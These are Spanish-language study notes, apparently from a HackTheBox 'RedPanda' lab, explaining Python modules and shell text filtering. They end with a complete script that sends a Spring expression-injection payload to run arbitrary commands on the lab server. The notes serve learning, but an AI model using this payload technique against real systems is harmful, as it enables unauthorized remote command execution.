## Uso de la consola de pyhton

Si necesitas ayuda sobre una clase por ejemplo la de ""dnspython" lo que se puede hacer es lo sigiuente

```
python3 
import dns.zone as dz
para ver que metodos se puedne utilizar 
help(dz. Tab # auto completa todo y te muestra que podemos utilizar 

```
![image](https://user-images.githubusercontent.com/63270579/209983814-f4cf67bc-7811-49d7-a94c-9b74f9381c27.png)


## Pensamiento para tratar con funciones desconocidas

Por ejemplo tenemos esto:

```
from_xfr(xfr, zone_factory=<class 'dns.zone.Zone'>, relativize=True, check_origin=True)
```
Si te das cuenta hay valores con igual esos son por defecto pero el primero al parecer ese si es afuerzas entonces tendrias que ver que es

![image](https://user-images.githubusercontent.com/63270579/209988709-e18ae2c4-1bcf-4258-82b3-74ae2adaa52e.png)


Necesitamos un objeto 

```
import dns.query as dq
# axfr = dz.from_xfr(dq.xfr())

```

Y pues ni modo no sabemos que hace de nuevo nos ayudamos del help


```
 help(dq.xfr) 
 ```
 
 
 
 


# Script explicado RedPanda 

## Import os

> The OS module in Python provides functions for interacting with the operating system. OS comes under Python’s standard utility modules. This module provides a portable way of using operating system-dependent functionality. The *os* and *os.path* modules include many functions to interact with the file system

```
os.name
#output 
posix
```
### Ejemplo desde dentro del script ( no se te olvide escapar las dobles comillas para que no las interprete literal )

```
os.system("cat output.txt | awk '/searched/,/<\/h2>/' | sed 's/ <h2 class="searched">You searched for: //' | sed 's/ <\/h2>//'"
```

## Import requests

> allows you to send HTTP/1.1 requests extremely easily. There’s no need to manually add query strings to your URLs, or to form-encode your POST data. Keep-alive and HTTP connection pooling are 100% automatic, thanks to urllib3.


# Import sys 

> The sys module in Python provides various functions and variables that are used to manipulate different parts of the Python runtime environment. It allows operating on the interpreter as it provides access to the variables and functions that interact strongly with the interpreter. Let’s consider the below example.


Un ejemplo de esto es la manipulacion de argumentos que se le pasan al script ejemplo:

```
./script.py Hello Python agr3 masa
#out 
['./script.py', 'Hello', 'Python', 'agr3', 'masa']

sys.argv[0] == ‘script.py’ 
sys.argv[1] == ‘Hello’ 
sys.argv[2] == ‘Python

```

## Import  pdb — The Python Debugger

> The module pdb defines an interactive source code debugger for Python programs. It supports setting (conditional) breakpoints and single stepping at the source line level, inspection of stack frames, source code listing, and evaluation of arbitrary Python code in the context of any stack frame. It also supports post-mortem debugging and can be called under program control.

### Break point

```
pdb.set_trace()
```
te aparece un prompt ahi puedes poner por el nombre de la variable por ejemplo en el caso del script pues "command" ademas si pones la "l" te pone en que linea.

![image](https://user-images.githubusercontent.com/63270579/207769257-945472c3-9b7a-4b1c-8e51-e7ac5a5aa7b9.png)


## SIGNAL in Linux

> A signal is an event generated by the UNIX and Linux systems in response to some condition. Upon receipt of a signal, a process may take action. A signal is just like an interrupt; when it is generated at the user level, a call is made to the kernel of the OS, which then acts accordingly.

```
man signals

```

![image](https://user-images.githubusercontent.com/63270579/207737677-f2118d2d-944c-4561-9bcb-cfae917124a4.png)


## Import signal

> Este módulo proporciona mecanismos para usar gestores de señales en Python.

> La función signal.signal() permite definir gestores personalizados que serán ejecutados cuando una señal es recibida. Un pequeño número de gestores por defecto son instalados: SIGPIPE es ignorada (por lo que los errores de escritura en tuberías y sockets se pueden informar como excepciones ordinarias de Python) y SIGINT es trasladada en una excepción KeyboardInterrupt si el proceso padre no lo ha cambiado.

```

def def_handler(sig, frame):
	print("\n\n [!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

```


## Import time

> This module provides various time-related functions. For related functionality, see also the datetime and calendar modules.

Por ejemplo se puede usar sleep:

```
#!/usr/bin/python3 

import requests,sys,pdb,signal,os, time 


def def_handler(sig, frame):
	print("\n\n [!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	time.sleep(10)

```


## Python ord()

> The ord() function returns an integer representing the Unicode character.

```
print(ord('@'))   
64
>>> print(ord('A'))                    
65   

```

## Import requests

Sirve para hacer peticiones tanto post como get y otras supongo en este caso aqui tienen un ejemplo de una peticion post:

```
search_url="http://10.10.11.170:8080/search"
	post_data = {
		'name':payload # mira como tienen comillas para evitar que interprete una variable
	}
	r = requests.post(search_url, data=post_data)
```

## Chrome ver peticiones 

Para ver las peticiones sin que tengas que usar el burpsuite ( muy util ) pestaña network oprimes el boton genera una peticion la selecciona y te vas a request para ver que datos manda en este caso el campo name

![image](https://user-images.githubusercontent.com/63270579/208353699-b009464d-5c7f-4c5c-a158-399f7a94dd75.png)


## Opening Files in Python

> Python has a built-in open() function to open a file. This function returns a file object, also called a handle, as it is used to read or modify the file accordingly.

### Para archivos existentes

```

>>> f = open("test.txt")    # open file in current directory
>>> f = open("C:/Python38/README.txt")  # specifying full path

```

#### Para crear un nuevo archivo


```
	f = open("output.txt", "w")
	f.write(r.text)
	f.close()
```




> https://www.programiz.com/python-programming/file-operation

## AWK Rango

Tenemos que filtrar el output del programa el comando id el cual es el siguiente:

```
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Red Panda Search | Made with Spring Boot</title>
    <link rel="stylesheet" href="css/search.css">
  </head>
  <body>
    <form action="/search" method="POST">
    <div class="wrap">
      <div class="search">
        <input type="text" name="name" placeholder="Search for a red panda">
        <button type="submit" class="searchButton">
          <i class="fa fa-search"></i>
        </button>
      </div>
    </div>
  </form>
    <div class="wrapper">
  <div class="results">
    <h2 class="searched">You searched for: uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
</h2>
      <h2>There are 0 results for your search</h2>
       
    </div>
    </div>
    
  </body>
</html>

```

Se usa un rango con awk '/desde/,/hasta nota como escapaste la diagolal de la tag h2 para que no entrara en conflicto/':

```
cat output.txt | awk '/searched/,/<\/h2>/'

```
Se usa sed para borrar o "sustituir" sed 's/lo que quieres sustuir/por lo que se va a sustituir/'

```
cat output.txt | awk '/searched/,/<\/h2>/' | sed 's/ <h2 class="searched">You searched for: //' | sed 's/ <\/h2>//'
```

## Script Completo

```
#!/usr/bin/python3 

import requests,sys,pdb,signal,os, time 


def def_handler(sig, frame):
	print("\n\n [!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 2:
	print("\n[!] El programa ha sido ejecutado incorrectamente\n")


def makePayload():
	command = sys.argv[1]
	payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % ord(command[0])
	command = command[1:] # osea quitas el caracter 0 es como rebuscado
	
	for character in command:
		payload += ".concat(T(java.lang.Character).toString(%s))" % ord(character)
	payload += ").getInputStream())}"	
	return payload


def makeRequest(payload):
	search_url="http://10.10.11.170:8080/search"
	post_data = {
		'name':payload
	}
	r = requests.post(search_url, data=post_data)
	#print(r.text)
	f = open("output.txt", "w")
	f.write(r.text)
	f.close()
	os.system("cat output.txt | awk '/searched/,/<\/h2>/' | sed 's/ <h2 class=\"searched\">You searched for: //' | sed 's/<\/h2>//'")
	os.remove("output.txt")

if __name__ == '__main__':
	payload = makePayload()
	makeRequest(payload)
	
```	
